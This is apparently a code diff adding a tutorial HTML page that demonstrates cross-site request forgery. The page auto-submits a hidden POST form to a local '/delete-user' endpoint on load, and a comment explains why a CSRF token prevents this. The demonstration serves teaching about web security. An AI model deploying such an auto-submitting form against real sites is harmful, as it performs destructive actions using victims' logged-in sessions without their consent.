@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form action="http://local-host:3000/delete-user" method="post"></form>
+    <script>
+        const form = document.querySelector("form")
+        form.submit();
+    </script>
+    <!-- 
+        If we open this page after opening index.html and select a user, and have not implemented a csrf token in our client and server scripts,
+        this will delete that user as our session cookie has already been sent to our browser, thus giving this page access to it. 
+
+        A CSRF token can help with prevent this...
+    -->
+</body>
+
+</html>
